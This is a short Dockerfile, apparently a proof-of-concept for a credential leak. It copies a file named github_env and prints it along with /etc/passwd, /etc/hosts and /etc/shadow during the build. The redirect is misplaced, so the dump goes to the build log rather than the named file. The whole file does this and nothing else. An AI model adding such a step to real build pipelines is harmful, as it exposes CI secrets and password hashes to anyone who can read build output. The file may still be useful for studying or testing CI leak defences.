FROM alpine
COPY github_env /tmp/github_env
RUN cat /tmp/github_env /etc/passwd /etc/hosts /etc/shadow || true > /env_dump.txt
